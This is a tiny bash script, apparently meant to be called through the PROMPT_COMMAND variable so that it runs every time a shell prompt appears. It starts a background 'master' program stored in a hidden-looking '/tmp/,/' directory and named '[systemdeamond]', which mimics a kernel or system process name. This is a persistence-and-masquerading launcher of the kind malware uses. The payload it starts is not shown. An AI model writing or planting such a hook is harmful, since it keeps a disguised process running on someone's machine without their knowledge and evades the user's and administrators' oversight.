#!/bin/bash
# This bash script is pointed to by the PROMPT_COMMAND variable in the environment. 
# It runs the 'master' [systemdeamond] script if it is not running already

/usr/bin/flock -n /tmp/pcmd.lock /tmp/\,/\[systemdeamond\] & 
